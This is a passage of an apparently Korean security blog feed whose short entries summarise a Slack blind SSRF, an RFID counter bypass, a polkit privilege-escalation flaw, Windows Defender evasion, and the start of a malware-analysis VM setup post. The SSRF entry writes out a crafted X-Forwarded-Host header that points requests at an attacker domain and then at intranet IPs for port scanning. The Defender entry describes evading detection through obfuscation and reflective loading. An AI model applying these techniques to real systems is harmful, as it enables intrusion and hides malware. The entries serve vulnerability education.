500 Internal server error&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xD638;&#xC2A4;&#xD2B8; &#xC774;&#xB984;&#xC758; &#xB05D; &#xBD80;&#xBD84;&#xC5D0; &#x2018;@&#x2019;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD574;&#xB2F9; request&#xB294; &#xD504;&#xB860;&#xD2B8; &#xC5D4;&#xB4DC;&#xAC00; &#xC544;&#xB2CC; &#xBC31; &#xC5D4;&#xB4DC;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4; Blind SSRF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xC778;&#xD2B8;&#xB77C;&#xB137;&#xC5D0; arbitrary request&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xC751;&#xB2F5; &#xC2DC;&#xAC04;&#xC744; &#xD1B5;&#xD574; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xD2B8;&#xB77C;&#xB137;&#xC5D0; &#xC5F4;&#xB824;&#xC788;&#xB294; &#xD3EC;&#xD2B8;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC2AC;&#xB799;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#x201C;Open original&#x201D;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xBCF8; &#xC774;&#xBBF8;&#xC9C0; &#xACBD;&#xB85C;&#xB97C; &#xCC3E;&#xC544; burp suite&#xB85C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</li><li>repeater&#xB85C; &#xC804;&#xC1A1;&#xD558;&#xACE0; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p><code>X-Forwarded-Host: xxx.com</code>&#xC744; &#xD5E4;&#xB354;&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xC5EC; 500 error&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>&#xC73C;&#xB85C; &#xD5E4;&#xB354;&#xB97C; &#xC218;&#xC815;&#xD558;&#xACE0; 302 response&#xAC00; &#xC624;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xACBD;&#xB85C;&#xB294; <code>YOUR_DOMAIN/files-pri/...</code>&#xB85C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li>&#xB3C4;&#xBA54;&#xC778;&#xC5D0; request&#xAC00; &#xC804;&#xC1A1;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC778;&#xD2B8;&#xB77C;&#xB137; IP&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;. &#xD3EC;&#xD2B8;&#xB97C; &#xBC14;&#xAFD4;&#xAC00;&#xBA70; &#xC751;&#xB2F5; &#xC2DC;&#xAC04;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>information disclosure</tag>
      
      <tag>ssrf</tag>
      
      <tag>idioth</tag>
      
      <tag>slack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
    <link href="/2021/06/09/fabu1ous/2021-06-09/"/>
    <url>/2021/06/09/fabu1ous/2021-06-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralight&#xC640; NTAG &#xCE74;&#xB4DC;&#xB294; replay &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; Monotonic Counter &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC744; tear off &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; &#xBB34;&#xB825;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Tear off &#xACF5;&#xACA9;&#xC774;&#xB780; RFID &#xD0DC;&#xADF8;&#xC640; &#xB9AC;&#xB354; &#xC0AC;&#xC774; &#xB370;&#xC774;&#xD130; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xB3C4;&#xC911;&#xC5D0; &#xD1B5;&#xC2E0;&#xC744; &#xB04A;&#xC5B4;&#xBC84;&#xB9AC;&#xB294; &#xACF5;&#xACA9; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; EEPROM&#xC774; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xB294; &#xB3D9;&#xC548; RFID &#xD0DC;&#xADF8;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC77C;&#xAD00;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB418;&#xC5B4; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><p>MIFARE Ultralight EV1&#xC740; 24-bit Monotonic Counter&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC774;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>INCR_CNT</code> : Counter&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A8;&#xB2E4;.</li><li><code>READ_CNT</code> : &#xD604;&#xD0DC; Counter&#xC758; &#xAC12;&#xC744; &#xC77D;&#xB294;&#xB2E4;.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flag&#xB97C; &#xAC80;&#xC99D;&#xD55C;&#xB2E4;.</li></ol><p><code>INCR_CNT</code>&#xB97C; &#xD1B5;&#xD574; &#xC720;&#xD6A8;&#xD55C; Counter&#xC758; &#xAC12;&#xC744; &#xC99D;&#xAC00; &#xC2DC;&#xD0B4;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; tear off &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; Counter&#xC5D0; &#xB300;&#xD55C; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC5D0; &#xC778;&#xD130;&#xB7FD;&#xD2B8;&#xB97C; &#xAC78; &#xC218; &#xC788;&#xACE0;, <code>READ_CNT</code>&#xAC00; &#xC774;&#xC804; Counter&#xC758; &#xAC12;&#xC744; &#xB9AC;&#xD134;&#xD558;&#xBA74;&#xC11C; <code>CHECK_TEARING_EVENT</code>&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC80;&#xC99D; flag&#xB97C; &#xB9AC;&#xD134;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rfid</tag>
      
      <tag>monotonic counter</tag>
      
      <tag>tear off</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3560: Ubuntu/Fedora 인증 관리 프로그램 polkit의 로컬 권한 상승 취약점</title>
    <link href="/2021/06/08/l0ch/2021-06-08/"/>
    <url>/2021/06/08/l0ch/2021-06-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/180">CVE-2021-3560 polkit: local privilege escalation using polkit_system_bus_name_get_creds_sync()</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>polkit 0.113 ~ 0.118</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>polkit&#xC740; Unix &#xACC4;&#xC5F4; OS(Ubuntu, Fedora &#xB4F1;&#xC758; &#xB9AC;&#xB205;&#xC2A4; &#xBC30;&#xD3EC;&#xD310;)&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xC804;&#xBC18;&#xC758; &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xC81C;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C;, sudo &#xB4F1; &#xAE30;&#xC874; &#xC778;&#xC99D; &#xC2DC;&#xC2A4;&#xD15C;&#xACFC; &#xB2EC;&#xB9AC; &#xB290;&#xC2A8;&#xD55C; &#xC218;&#xC900;&#xC758; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD574; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xACC4;&#xC815;&#xACFC; &#xCEE4;&#xBBA4;&#xB2C8;&#xCF00;&#xC774;&#xC158;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/06/08/l0ch/2021-06-08/1.png" alt></p><blockquote><p>&#xCD9C;&#xCC98; : <a href="https://ko.wikipedia.org/wiki/&#xD3F4;&#xD0B7;">&#xC704;&#xD0A4;&#xBC31;&#xACFC;</a></p></blockquote><p>polkit&#xC740;  <code>polkit_system_bus_name_get_creds_sync()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAD8C;&#xD55C;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xC694;&#xCCAD;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; uid &#xBC0F; pid&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC694;&#xCCAD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xACE0;&#xC720;&#xD55C; bus name&#xC744; <a href="https://ko.wikipedia.org/wiki/D-Bus">D-bus</a>&#xC758; <code>dbus-daemon</code>&#xC5D0; &#xC804;&#xC1A1;&#xD574; &#xC694;&#xCCAD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294;&#xB370;, &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC9C1;&#xC804;&#xC5D0; &#xC694;&#xCCAD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; <code>dbus-daemon</code>&#xC758; &#xC5F0;&#xACB0;&#xC774; &#xB04A;&#xC5B4;&#xC9C8; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>dbus-daemon</code>&#xC740; &#xC5F0;&#xACB0;&#xC774; &#xB04A;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; bus name&#xC774; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; error &#xC751;&#xB2F5;&#xC744; &#xBCF4;&#xB0B4;&#xC9C0;&#xB9CC; <code>polkit_system_bus_name_get_creds_sync()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC654;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC758; TRUE&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;&#xC790; &#xC77C;&#xBD80;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAC80;&#xC99D; &#xC5C6;&#xC774; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB41C; <code>AsyncGetBusNameCredsData</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC694;&#xCCAD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; uid&#xB97C; 0&#xC73C;&#xB85C; &#xC0DD;&#xAC01;&#xD558;&#xACE0; root &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC694;&#xCCAD;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xC815;&#xBCF4;&#xB294; <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a</a>  &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>ubuntu</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>fedora</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 간단한 Defender 우회 방법</title>
    <link href="/2021/06/07/idioth/2021-06-07/"/>
    <url>/2021/06/07/idioth/2021-06-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/">How to bypass Defender in a few easy steps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; signature detection, heuristics detection, in memory detection&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>signature&#xC758; &#xACBD;&#xC6B0; &#xC774;&#xBBF8; &#xC54C;&#xB824;&#xC9C4; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xD30C;&#xC77C; &#xC804;&#xCCB4;&#xC758; &#xD574;&#xC26C; &#xAC12;&#xC774;&#xB098; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC758; &#xC77C;&#xBD80; &#xD574;&#xC26C; &#xAC12;&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. heuristics&#xB294; signature &#xD0D0;&#xC9C0; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD558;&#xC5EC; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB098; &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; &#xC5B4;&#xB5A0;&#xD55C; &#xD589;&#xC704;&#xB97C; &#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC5C6;&#xB294; fileless &#xC545;&#xC131;&#xCF54;&#xB4DC;(powershell, vba macro, reflection for c# assembly)&#xC758; &#xACBD;&#xC6B0; Microsoft Defender&#xB294; <a href="https://docs.microsoft.com/ko-kr/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a> &#xC2A4;&#xCE94;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>signature detection&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC5B4;&#xB5A0;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xAC00; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB85C; &#xD310;&#xB2E8;&#xD588;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. AntiScan.me, VirusTotal&#xC5D0;&#xC11C; <code>DefenderCheck</code>, <code>Find-AVSignature</code> &#xB4F1;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xB0B8; &#xD6C4; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB9AC;&#xD329;&#xD130;&#xB9C1;&#xD558;&#xAC70;&#xB098; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xAC01; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB9C8;&#xB2E4; &#xC218;&#xD589;&#xD558;&#xAC70;&#xB098; &#xD30C;&#xC77C;&#xC774; &#xC190;&#xC0C1;&#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> &#xAC19;&#xC740; &#xB3C4;&#xAD6C;&#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC;&#xB97C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xC5EC; signature detection&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>C#&#xC73C;&#xB85C; &#xC791;&#xC131;&#xB41C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xACBD;&#xC6B0; <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; heuristics detection&#xACFC; in memory detection&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. NetLoader&#xB294; C# &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xACBD;&#xB85C;, URL&#xC774;&#xB098; SM &#xACF5;&#xC720;&#xC5D0;&#xC11C; reflection&#xC744; &#xD1B5;&#xD574; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; heuristics detection&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xACE0; Microsoft&#xC5D0;&#xC11C; NetLoader&#xC5D0; signature&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC9C0; &#xC54A;&#xC544; in memory detection &#xB610;&#xD55C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>defender</tag>
      
      <tag>antivirus</tag>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>signature</tag>
      
      <tag>heuristic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자!</title>
    <link href="/2021/06/06/idioth/setting_malware_vm/"/>
    <url>/2021/06/06/idioth/setting_malware_vm/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB298; &#xAC00;&#xC838;&#xC628; &#xC8FC;&#xC81C;&#xB294; &#x201C;&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC6A9; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xC124;&#xC815; &#xC790;&#xB3D9;&#xD654;&#x201D;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB2DD;&#xAC90;&#xC740; &#xADC0;&#xCC2E;&#xC740; &#xD589;&#xB3D9;&#xC744; &#xD558;&#xAE30; &#xC2EB;&#xC5B4;&#xD569;&#xB2C8;&#xB2E4;.(&#xC800;&#xB9CC; &#xADF8;&#xB7F0; &#xAC74; &#xC544;&#xB2C8;&#xACA0;&#xC8E0;?) &#xBCF4;&#xD1B5; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC740; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xB610; &#xBD84;&#xC11D;&#xC6A9; VM&#xC744; &#xC5EC;&#xB7EC; &#xAC1C; &#xB4E4;&#xACE0; &#xC788;&#xAC70;&#xB098; &#xC544;&#xB2C8;&#xBA74; &#xB2E4;&#xB978; PC&#xC5D0; &#xC124;&#xCE58;&#xD574;&#xC57C; &#xD560; &#xC77C; &#xB4F1;&#xC774; &#xC788;&#xC8E0;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB294; &#xC9D1;&#xC5D0; &#xC788;&#xB294; &#xB370;&#xC2A4;&#xD06C;&#xD1B1;&#xACFC; &#xD559;&#xAD50;&#xB098; &#xCE74;&#xD398; &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB178;&#xD2B8;&#xBD81;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Windows &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC5D0;&#xB2E4;&#xAC00; &#xC774;&#xB7F0;&#xC800;&#xB7F0; &#xB3C4;&#xAD6C;&#xB4E4;&#xC744; &#xC124;&#xC815;&#xD558;&#xBA74; &#xC6A9;&#xB7C9;&#xC774; &#xCEE4;&#xC838;&#xC11C; &#xC555;&#xCD95;&#xD558;&#xAC70;&#xB098; &#xC62E;&#xAE30;&#xB294; &#xB370;&#xC5D0;&#xB3C4; &#xC2DC;&#xAC04;&#xC774; &#xAF64; &#xAC78;&#xB9BD;&#xB2C8;&#xB2E4;. &#xBC16;&#xC5D0; &#xC788;&#xB294;&#xB370; &#xB178;&#xD2B8;&#xBD81;&#xC744; &#xD3EC;&#xB9F7;&#xD558;&#xAC70;&#xB098; &#xD558;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; Windows &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC744; &#xC0C8;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xC124;&#xC815;&#xC744; &#xCB49; &#xD574;&#xC57C; &#xD558;&#xC8E0;.</p><p>&#xD3EC;&#xB108;&#xBE14;&#xC744; &#xACF5;&#xBD80;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC6B0;&#xBD84;&#xD22C;&#xC5D0;&#xC11C;&#xB294; &#xC81C;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD234; &#xB4F1;&#xC744; &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC0F; &#xC124;&#xC815;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xB9AC;&#xB205;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB9CC; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB534;&#xC9D3;&#xC744; &#xD558;&#xB2E4; &#xC624;&#xBA74; &#xC138;&#xD305;&#xC774; &#xB2E4; &#xB418;&#xB294;&#xB370; Windows&#xB3C4; &#xAC00;&#xB2A5;&#xD560;&#xAE4C;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://github.com/fireeye/flare-vm">FireEye&#xC5D0;&#xC11C; &#xBC30;&#xD3EC;&#xD558;&#xB294; FlareVM</a>&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; &#xBAA8;&#xB4E0; &#xD234;&#xC744; &#xB2E4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xAE30;&#xB3C4; &#xD558;&#xACE0; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xBA74; &#xD558;&#xB8E8; &#xC885;&#xC77C; &#xAC78;&#xB9AC;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xB354;&#xB77C;&#xACE0;&#xC694;&#x2026; &#xADF8;&#xB798;&#xC11C; &#xAC70;&#xAE30;&#xC11C; &#xC601;&#xAC10;&#xC744; &#xC5BB;&#xC5B4;&#xC11C; &#xC81C;&#xAC00; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD234;&#xB4E4;&#xB85C; &#xAD6C;&#xC131;&#xD558;&#xC5EC; &#xC791;&#xC131;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.(FlareVM&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xCF54;&#xB4DC;&#xB3C4; 